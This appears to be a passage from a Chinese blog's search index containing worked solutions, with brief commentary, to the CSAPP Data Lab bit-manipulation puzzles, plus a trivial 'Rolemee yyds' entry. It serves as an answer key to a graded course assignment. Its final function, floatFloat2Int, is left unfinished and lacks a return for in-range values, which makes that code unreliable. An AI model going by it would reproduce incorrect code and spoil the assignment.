class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span><br><span class="hljs-comment"> *   Example: isAsciiDigit(0x35) = 1.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x3a) = 0.</span><br><span class="hljs-comment"> *            isAsciiDigit(0x05) = 0.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 15</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isAsciiDigit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> sigh=x&gt;&gt;<span class="hljs-number">31</span>;<br>  <span class="hljs-keyword">int</span> up=<span class="hljs-number">0x39</span>;<br>  <span class="hljs-keyword">int</span> down=<span class="hljs-number">0x30</span>;<br>  down =~down+<span class="hljs-number">1</span>;<br>  up=(up+~x+<span class="hljs-number">1</span>)&gt;&gt;<span class="hljs-number">31</span>;<br>  down=(down+x)&gt;&gt;<span class="hljs-number">31</span>;<br>  <span class="hljs-keyword">return</span> !(sigh|up|down);<br>&#125;<br></code></pre></td></tr></table></figure><p>这题比较困难建议自己看着理解一下，一开始是打算做每一位运算的，但是发现这个方法只适用0~9但是没有普遍性，所以写了一个具有普遍性的。</p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * conditional - same as x ? y : z </span><br><span class="hljs-comment"> *   Example: conditional(2,4,5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 16</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">conditional</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y, <span class="hljs-keyword">int</span> z)</span> </span>&#123;<br>  x=!!x;<br>  x=~x+<span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">int</span> result=(x&amp;y)+(~x&amp;z);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题就是<del>0+1和</del>1+1的技巧，貌似也没啥。</p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span><br><span class="hljs-comment"> *   Example: isLessOrEqual(4,5) = 1.</span><br><span class="hljs-comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 24</span><br><span class="hljs-comment"> *   Rating: 3</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isLessOrEqual</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> sigh=<span class="hljs-number">0x1</span>&lt;&lt;<span class="hljs-number">31</span>;<br>  <span class="hljs-keyword">int</span> bitXor=(!(x&amp;sigh))^(!(y&amp;sigh));<br><br>  <span class="hljs-keyword">int</span> m=~x+<span class="hljs-number">1</span>+y;<br>  m=m&gt;&gt;<span class="hljs-number">31</span>;<br>  <span class="hljs-keyword">return</span> ((!bitXor)&amp;(!m)|(bitXor&amp;(x&gt;&gt;<span class="hljs-number">31</span>)));<br>&#125;<br></code></pre></td></tr></table></figure><p>略</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*  * logicalNeg - implement the ! operator, using all of  *              the legal operators except ! *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; *   Max ops: 12 *   Rating: 4  */</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">logicalNeg</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;  <span class="hljs-keyword">return</span> ((x|(~x+<span class="hljs-number">1</span>))&gt;&gt;<span class="hljs-number">31</span>)+<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><p>这里需要注意的是，补码右移的性质</p><p>负数在内存中表示的话最高位是符号位 负数为 1</p><p>做右移的话最高位会用1填充。</p><p>右移31位的话那么最后的数就是 0xffffffff了。<br>这个在内存中表示的就是有符号数的 -1</p><p>其次就是0的负数最高位仍然是0。</p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in *             two&#x27;s complement *  Examples: howManyBits(12) = 5 *            howManyBits(298) = 10 *            howManyBits(-5) = 4 *            howManyBits(0)  = 1 *            howManyBits(-1) = 1 *            howManyBits(0x80000000) = 32 *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; *  Max ops: 90 *  Rating: 4 */</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">howManyBits</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;  <span class="hljs-keyword">int</span> i16,i8,i4,i2,i1,i0;  <span class="hljs-keyword">int</span> sigh=x&gt;&gt;<span class="hljs-number">31</span>;  x=(sigh&amp;~x)|(~sigh&amp;x);  i16=!!(x&gt;&gt;<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">4</span>;  x=x&gt;&gt;i16;  i8=!!(x&gt;&gt;<span class="hljs-number">8</span>)&lt;&lt;<span class="hljs-number">3</span>;  x=x&gt;&gt;i8;  i4=!!(x&gt;&gt;<span class="hljs-number">4</span>)&lt;&lt;<span class="hljs-number">2</span>;  x=x&gt;&gt;i4;  i2=!!(x&gt;&gt;<span class="hljs-number">2</span>)&lt;&lt;<span class="hljs-number">1</span>;  x=x&gt;&gt;i2;  i1=!!(x&gt;&gt;<span class="hljs-number">1</span>);  x=x&gt;&gt;i1;  i0=x;  <span class="hljs-keyword">return</span> i16+i8+i4+i2+i1+i0+<span class="hljs-number">1</span>;&#125;<br></code></pre></td></tr></table></figure><p>就是让你判断x用补码表示最少需要几位</p><p>就是一个二分的思想。</p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*  * floatScale2 - Return bit-level equivalent of expression 2*f for *   floating point argument f. *   Both the argument and result are passed as unsigned int&#x27;s, but *   they are to be interpreted as the bit-level representation of *   single-precision floating point values. *   When argument is NaN, return argument *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while *   Max ops: 30 *   Rating: 4 */</span><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">floatScale2</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;  <span class="hljs-keyword">int</span> <span class="hljs-built_in">exp</span>=(uf&amp;<span class="hljs-number">0x7f800000</span>)&gt;&gt;<span class="hljs-number">23</span>;  <span class="hljs-keyword">int</span> sigh=uf&amp;(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">31</span>);  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">0</span>)  <span class="hljs-keyword">return</span> uf&lt;&lt;<span class="hljs-number">1</span>|sigh;  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">255</span>)  <span class="hljs-keyword">return</span> uf;  <span class="hljs-built_in">exp</span>+=<span class="hljs-number">1</span>;  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>==<span class="hljs-number">255</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">0x7f800000</span>|sigh;  <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exp</span>&lt;&lt;<span class="hljs-number">23</span>)|(uf&amp;<span class="hljs-number">0x807fffff</span>);&#125;<br></code></pre></td></tr></table></figure><p>求2乘一个浮点数</p><p>首先需要对浮点数的存放有一个初步认识，浮点数的32位中分了三块，这个自行csdn</p><p>这里需要对无穷大，0特殊处理，（其实看了答案还有NaN，和无穷小，虽然我不知道NaN是怎么寄存的，但是问题不大</p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*  * floatFloat2Int - Return bit-level equivalent of expression (int) f *   for floating point argument f. *   Argument is passed as unsigned int, but *   it is to be interpreted as the bit-level representation of a *   single-precision floating point value. *   Anything out of range (including NaN and infinity) should return *   0x80000000u. *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while *   Max ops: 30 *   Rating: 4 */</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;  <span class="hljs-keyword">int</span> sigh=uf&gt;&gt;<span class="hljs-number">31</span>;  <span class="hljs-keyword">int</span> <span class="hljs-built_in">exp</span>=((uf&amp;<span class="hljs-number">0x7f800000</span>)&gt;&gt;<span class="hljs-number">23</span>)<span class="hljs-number">-127</span>;  <span class="hljs-keyword">int</span> result=(uf&amp;<span class="hljs-number">0x007fffff</span>)|<span class="hljs-number">0x00800000</span>;  <span class="hljs-keyword">if</span>(!(uf&amp;<span class="hljs-number">0x7fffffff</span>)) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>&gt; <span class="hljs-number">31</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0x80000000</span>;  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">exp</span>&lt;<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>略</p>]]></content>
    
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Rolemee yyds</title>
    <link href="/2021/07/10/hello-world/"/>
    <url>/2021/07/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>roleemee,yyds</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
